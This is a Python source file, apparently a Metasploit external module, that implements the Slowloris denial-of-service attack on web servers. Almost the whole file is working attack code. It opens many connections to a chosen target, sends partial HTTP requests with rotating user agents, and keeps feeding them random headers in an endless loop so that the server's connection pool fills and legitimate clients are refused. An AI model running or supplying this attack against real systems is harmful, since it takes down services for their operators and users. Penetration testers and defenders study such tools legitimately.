#!/usr/bin/env python
# Note, works with both python 2.7 and 3

import random
import socket
import ssl
import string
import time

from metasploit import module

metadata = {
    'name': 'Slowloris Denial of Service Attack',
    'description': '''
        Slowloris tries to keep many connections to the target web server open and hold them open as long as possible.
        It accomplishes this by opening connections to the target web server and sending a partial request.
        Periodically, it will send subsequent HTTP headers, adding to-but never completing-the request.
        Affected servers will keep these connections open, filling their maximum concurrent connection pool,
        eventually denying additional connection attempts from clients.
     ''',
    'authors': [
        'RSnake',  # Vulnerability disclosure
        'Gokberk Yaltirakli',  # Simple slowloris in Python
        'Daniel Teixeira',  # Metasploit module (Ruby)
        'Matthew Kienow <matthew_kienow[AT]rapid7.com>'  # Metasploit external module (Python)
    ],
    'date': '2009-06-17',
    'references': [
        {'type': 'cve', 'ref': '2007-6750'},
        {'type': 'cve', 'ref': '2010-2227'},
        {'type': 'edb', 'ref': '8976'},
        {'type': 'url', 'ref': 'https://github.com/gkbrk/slowloris'}
     ],
    'type': 'dos',
    'options': {
        'rhost': {'type': 'address', 'description': 'The target address', 'required': True, 'default': None},
        'rport': {'type': 'port', 'description': 'The target port', 'required': True, 'default': 80},
        'sockets': {'type': 'int', 'description': 'The number of sockets to use in the attack', 'required': True, 'default': 150},
        'delay': {'type': 'int', 'description': 'The delay between sending keep-alive headers', 'required': True, 'default': 15},
        'ssl': {'type': 'bool', 'description': 'Negotiate SSL/TLS for outgoing connections', 'required': True, 'default': False},
        'rand_user_agent': {'type': 'bool', 'description': 'Randomizes user-agent with each request', 'required': True, 'default': True}
     }}

list_of_sockets = []
user_agents = [
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
]


def create_random_header_name(size=8, seq=string.ascii_uppercase + string.ascii_lowercase):
    return ''.join(random.choice(seq) for _ in range(size))


def init_socket(host, port, use_ssl=False, rand_user_agent=True):
    s = socket.create_connection((host, port), 10)
    s.settimeout(4)

    if use_ssl:
        s = ssl.wrap_socket(s)

    s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8"))

    if rand_user_agent:
        s.send("User-Agent: {}\r\n".format(random.choice(user_agents)).encode("utf-8"))
    else:
        s.send("User-Agent: {}\r\n".format(user_agents[0]).encode("utf-8"))

    s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
    return s


def run(args):
    host = args['rhost']
    port = int(args['rport'])
    use_ssl = args['ssl'] == "true"
    rand_user_agent = args['rand_user_agent'] == "true"
    socket_count = int(args['sockets'])
    delay = int(args['delay'])

    module.log("Attacking %s with %s sockets" % (host, socket_count), 'info')

    module.log("Creating sockets...", 'info')
    for i in range(socket_count):
        try:
            module.log("Creating socket number %s" % i, 'debug')
            s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
        except socket.error:
            break
        list_of_sockets.append(s)

    while True:
        module.log("Sending keep-alive headers... Socket count: %s" % len(list_of_sockets), 'info')
        for s in list(list_of_sockets):
            try:
                s.send("{}: {}\r\n".format(create_random_header_name(random.randint(8, 16)),
                                           random.randint(1, 5000)).encode("utf-8"))

            except socket.error:
                list_of_sockets.remove(s)

        for _ in range(socket_count - len(list_of_sockets)):
            module.log("Recreating socket...", 'debug')
            try:
                s = init_socket(host, port, use_ssl=use_ssl, rand_user_agent=rand_user_agent)
                if s:
                    list_of_sockets.append(s)
            except socket.error:
                break
        time.sleep(delay)


if __name__ == "__main__":
    module.run(metadata, run)
